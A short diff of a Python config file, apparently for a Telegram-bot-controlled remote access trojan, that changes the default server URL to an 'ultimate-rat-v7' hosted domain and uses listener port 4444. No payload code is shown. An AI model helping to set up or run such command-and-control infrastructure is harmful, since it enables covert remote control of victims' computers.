@@ -7,7 +7,7 @@ ADMIN_CHAT_ID = 6454347745  # আপনার Chat ID - শুধুমাত্
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
 
 # ============== SERVER ==============
-SERVER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
+SERVER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://ultimate-rat-v7.onrender.com")
 LISTENER_PORT = int(os.environ.get("PORT", 4444))
 
 # ============== DATABASE ==============
